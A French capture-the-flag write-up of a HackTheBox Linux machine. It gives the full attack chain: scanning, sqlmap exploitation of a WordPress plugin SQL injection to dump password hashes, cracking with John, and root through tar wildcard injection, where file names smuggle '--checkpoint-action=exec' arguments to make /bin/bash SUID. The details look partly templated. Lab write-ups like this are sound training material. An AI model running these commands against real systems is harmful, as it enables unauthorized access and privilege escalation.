---
title: "Test — HackTheBox Writeup"
date: 2026-02-27
description: "Writeup de la box Test (Easy/Linux) sur HackTheBox — SQL Injection WordPress + Tar Wildcard Injection pour le privesc."
tags:
  - HackTheBox
  - HTB
  - Easy
  - Linux
  - SQLi
  - WordPress
  - Privilege Escalation
  - SUID
categories:
  - Writeups
  - HackTheBox
draft: false
---

## Introduction

Test est une box Linux de difficulté Easy sur HackTheBox. Elle expose un service SSH et un serveur web hébergeant un WordPress vulnérable. L'exploitation d'une injection SQL dans un plugin WordPress permet de récupérer des credentials, puis une élévation de privilèges via un binaire SUID custom complète la box.

---

## Reconnaissance

### Scan Nmap

```bash
nmap -sC -sV -oN nmap/test 10.10.11.42
```

```
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.10.11.42
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:ae:db:d4:52:14:18:6d:c9 (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Test Company
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Deux ports ouverts : SSH (22) et HTTP (80).

### Énumération Web

On accède au site web et on identifie un WordPress :

```bash
whatweb http://10.10.11.42
```

```
http://10.10.11.42 [200 OK] Apache[2.4.52], WordPress[6.4.3], PHP[8.1.27], Title[Test Company]
```

On lance un scan WPScan pour énumérer les plugins :

```bash
wpscan --url http://10.10.11.42 --enumerate p --api-token $WPSCAN_TOKEN
```

```
[+] flavor flavor-developer 2.1.3
 | Found By: Wp Content Dir (Passive Detection)
 | [!] 1 vulnerability identified:
 |     Title: flavor-developer <= 2.1.3 - Unauthenticated SQL Injection
 |     Reference: https://wpscan.com/vulnerability/xxxx-xxxx
```

Le plugin **flavor-developer 2.1.3** est vulnérable à une injection SQL non authentifiée.

---

## Foothold

### Exploitation SQLi

On exploite la SQLi avec `sqlmap` :

```bash
sqlmap -u "http://10.10.11.42/?flavor_id=1" --dbs --batch
```

```
available databases [2]:
[*] information_schema
[*] wordpress
```

On dump la table `wp_users` :

```bash
sqlmap -u "http://10.10.11.42/?flavor_id=1" -D wordpress -T wp_users --dump --batch
```

```
+----+----------+------------------------------------+
| ID | user_login | user_pass                         |
+----+----------+------------------------------------+
| 1  | admin    | $P$B6x....[hash tronqué]           |
| 2  | jsmith   | $P$BkR....[hash tronqué]           |
+----+----------+------------------------------------+
```

On crack le hash de `jsmith` avec John :

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```
sunshine2024     (jsmith)
```

---

## User

On se connecte en SSH avec les credentials trouvés :

```bash
ssh jsmith@10.10.11.42
```

```
jsmith@test:~$ cat user.txt
7a3f2b...........................
```

🚩 **User flag obtenu.**

---

## Privilege Escalation

### Énumération

On cherche les binaires SUID :

```bash
find / -perm -4000 -type f 2>/dev/null
```

```
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/chsh
/opt/backup
```

Le binaire `/opt/backup` est inhabituel. On l'analyse :

```bash
strings /opt/backup | grep tar
```

```
/usr/bin/tar cf /tmp/backup.tar.gz *
```

Le binaire exécute `tar` avec un wildcard (`*`) dans le répertoire courant. C'est vulnérable au **tar wildcard injection**.

### Exploitation

On crée les fichiers nécessaires dans un répertoire où le binaire opère :

```bash
cd /var/www/html/backups
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh privesc.sh"
echo -e '#!/bin/bash\nchmod +s /bin/bash' > privesc.sh
chmod +x privesc.sh
```

On exécute le binaire SUID :

```bash
/opt/backup
```

Le wildcard est interprété par tar comme des arguments. Le checkpoint exécute notre script en tant que root, ajoutant le bit SUID à `/bin/bash` :

```bash
ls -la /bin/bash
```

```
-rwsr-sr-x 1 root root 1396520 Mar 14 11:31 /bin/bash
```

```bash
bash -p
whoami
```

```
root
```

```bash
cat /root/root.txt
```

```
9c4e1a...........................
```

🚩 **Root flag obtenu.**

---

## Conclusion

Cette box Easy illustre deux techniques classiques :

1. **SQL Injection** sur un plugin WordPress non maintenu pour extraire des credentials
2. **Tar wildcard injection** via un binaire SUID custom pour l'élévation de privilèges

Points clés à retenir :
- Toujours énumérer les plugins WordPress et vérifier les CVE connues
- Les binaires SUID custom sont souvent des vecteurs de privesc
- L'utilisation de wildcards dans des commandes privilégiées est un anti-pattern de sécurité bien connu
